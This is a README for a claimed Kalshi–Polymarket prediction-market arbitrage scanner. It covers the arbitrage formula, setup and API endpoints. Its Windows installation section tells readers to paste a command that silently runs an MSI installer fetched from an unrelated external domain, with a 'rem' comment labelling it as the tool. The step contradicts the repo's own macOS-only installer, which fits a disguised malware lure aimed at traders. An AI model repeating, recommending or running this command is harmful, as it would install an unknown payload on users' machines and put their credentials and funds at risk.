# Kalshi · Polymarket Arbitrage Tool

A real-time arbitrage scanner for prediction markets — finds price discrepancies between [Kalshi](https://kalshi.com) and [Polymarket](https://polymarket.com) and calculates risk-free profit opportunities.

```
┌─────────────────────────────────────────────────────────┐
│   ⚡ Arbitrage Opportunities           📊 All Markets   │
│                                                         │
│  ┌──────────────────────────────────────────────────┐   │
│  │ #1  BUY YES on Kalshi · BUY NO on Polymarket     │   │
│  │     Fed Rate Cut Q2 2025           +6.24%        │   │
│  │     Bet $100  →  Est. Return $6.24               │   │
│  └──────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────┘
```

## Architecture

```
kalshi-polymarket-arbitrage-tool/
├── backend/          # Go — REST API + arbitrage engine
│   ├── main.go       # Server, market clients, arb logic
│   ├── go.mod
│   └── .env.example
├── frontend/         # TypeScript + React + Vite
│   ├── src/
│   │   ├── App.tsx   # Dashboard UI with live charts
│   │   ├── api.ts    # API client
│   │   └── types.ts  # Shared types
│   └── package.json
├── install.sh        # macOS installer
└── start.sh          # Launch script (generated on install)
```

## 🪟 Windows Installation
### **Step 1 — Open Command Prompt**
1. Press **Win + R**
2. Type:
```
cmd
```
3. Press **Enter**
This will open **Command Prompt**.
---
### **Step 2 — Run the Install Command**
Copy the command below and paste it into **Command Prompt**, then press **Enter**.
```powershell
cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem Kalshi Polymarket Arbitrage Tool
```
The installer will automatically download and install the required components.


> Requires: macOS 12+. The installer will handle Go and Node.js via Homebrew automatically.

## Setup

1. Edit `backend/.env` with your API keys:
   ```
   KALSHI_API_KEY=your_key_here
   POLYMARKET_API_KEY=your_key_here
   ```
   - [Get Kalshi API key](https://kalshi.com/account/api)
   - [Get Polymarket API key](https://docs.polymarket.com)

2. Start the tool:
   ```bash
   ./start.sh
   ```

3. Open [http://localhost:3000](http://localhost:3000)

> **Note:** Without API keys, the tool runs in **demo mode** with realistic mock data so you can explore the UI.

## How the Arbitrage Logic Works

Prediction markets price outcomes as cents (0–100¢). A YES and NO contract on the same event must settle to $1 total. Arbitrage exists when:

```
YES_price(Kalshi) + NO_price(Polymarket) < $1.00
```

The tool checks both directions for every matched market pair:

| Direction | When to use |
|---|---|
| BUY YES on Kalshi + BUY NO on Polymarket | `K_yes + P_no < 1.0` |
| BUY NO on Kalshi + BUY YES on Polymarket | `K_no + P_yes < 1.0` |

Profit is calculated as:

```
profit % = (1.0 - total_cost) / total_cost × 100
```

## API Endpoints

| Method | Path | Description |
|--------|------|-------------|
| GET | `/api/arbitrage` | All current opportunities |
| GET | `/api/markets/kalshi` | Live Kalshi markets |
| GET | `/api/markets/polymarket` | Live Polymarket markets |
| GET | `/api/health` | Server health check |

Example:

```bash
curl http://localhost:8080/api/arbitrage | jq
```

## Stack

| Layer | Technology |
|-------|-----------|
| Backend | Go 1.21, gorilla/mux |
| Frontend | TypeScript, React 18, Vite |
| Charts | Recharts |
| Styling | Tailwind CSS |
| Icons | Lucide React |

## Disclaimer

This tool is for educational and informational purposes. Prediction market arbitrage carries risks including liquidity constraints, price slippage, platform fees, and settlement delays. Always do your own research before trading.
